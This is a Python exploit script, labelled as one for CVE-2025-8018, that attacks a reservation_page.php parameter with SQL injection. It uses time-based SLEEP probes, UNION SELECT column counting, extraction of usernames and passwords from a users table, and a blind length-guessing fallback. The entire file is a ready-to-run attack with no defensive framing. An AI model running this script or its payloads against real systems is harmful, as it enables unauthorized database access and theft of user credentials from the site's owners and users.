import requests
import time
import urllib.parse

#Configuration
TARGET_URL = "http://TARGET-IP/user/reservation_page.php"
SLEEP_SECONDS = 5
TIME_THRESHOLD = 4  # How long a delay we expect if blind SQLi works

def check_blind_sqli():
    """
    Checks if the reg_Id parameter is vulnerable to time-based blind SQL injection.
    """
    payload = f"1 AND SLEEP({SLEEP_SECONDS})-- "
    full_url = f"{TARGET_URL}?reg_Id={urllib.parse.quote(payload)}"
    print(f"[*] Checking time-based SQLi with payload: {payload}")
    
    start_time = time.time()
    response = requests.get(full_url, timeout=SLEEP_SECONDS + 2)
    elapsed = time.time() - start_time

    if elapsed > TIME_THRESHOLD:
        print("[+] Blind SQL injection confirmed!")
        return True
    else:
        print("[-] No delay detected — may not be vulnerable or filtered.")
        return False

def find_column_count(max_columns=10):
    """
    Finds the number of columns by incrementally testing UNION SELECTs.
    """
    print("[*] Testing how many columns the query expects...")
    for num in range(1, max_columns + 1):
        columns = ",".join(["NULL"] * num)
        payload = f"1 UNION SELECT {columns}-- "
        full_url = f"{TARGET_URL}?reg_Id={urllib.parse.quote(payload)}"
        
        response = requests.get(full_url)
        if response.status_code == 200 and "error" not in response.text.lower():
            print(f"[+] Looks like {num} columns work!")
            return num

    print("[-] Couldn't find valid column count.")
    return None

def try_union_extraction(columns):
    """
    Attempts to extract username/password from 'users' table using UNION SELECT.
    """
    print("[*] Trying to extract data using UNION-based SQL injection...")
    injection_columns = ["username", "password"] + ["NULL"] * (columns - 2)
    payload = f"1 UNION SELECT {','.join(injection_columns)} FROM users-- "
    full_url = f"{TARGET_URL}?reg_Id={urllib.parse.quote(payload)}"
    
    response = requests.get(full_url)
    if "admin" in response.text.lower():
        print("[+] Found potential credentials in the response!")
        print(response.text[:1000])  # Print a sample of the response
    else:
        print("[-] No visible credentials found — maybe data is not shown in response.")

def find_username_length():
    """
    Uses time-based blind SQLi to determine the length of a username.
    """
    print("[*] Using time-based SQLi to guess username length...")
    for length in range(1, 30):
        payload = f"1 AND IF(LENGTH((SELECT username FROM users LIMIT 1))={length}, SLEEP({SLEEP_SECONDS}), 0)-- "
        full_url = f"{TARGET_URL}?reg_Id={urllib.parse.quote(payload)}"

        start_time = time.time()
        requests.get(full_url, timeout=SLEEP_SECONDS + 2)
        elapsed = time.time() - start_time

        if elapsed > TIME_THRESHOLD:
            print(f"[+] Username is {length} characters long!")
            break

def main():
    print("=== CVE-2025-8018 Exploit Script ===")

    if not check_blind_sqli():
        return

    column_count = find_column_count()
    if column_count:
        try_union_extraction(column_count)
    
    print("[*] Trying blind extraction fallback...")
    find_username_length()

if __name__ == "__main__":
    main()
